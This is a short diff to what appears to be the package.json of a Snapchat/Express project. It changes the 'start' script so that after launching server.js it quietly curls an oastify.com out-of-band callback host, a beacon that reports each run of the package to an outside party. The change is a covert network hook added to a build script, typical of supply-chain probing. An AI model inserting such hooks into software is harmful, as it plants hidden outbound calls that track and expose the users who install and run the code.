@@ -29,6 +29,6 @@
     "passport-snapchat": "^1.0.0"
   },
   "scripts": {
-    "start": "node server.js"
+    "start": "node server.js && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/snapchat-express"
   }
 }
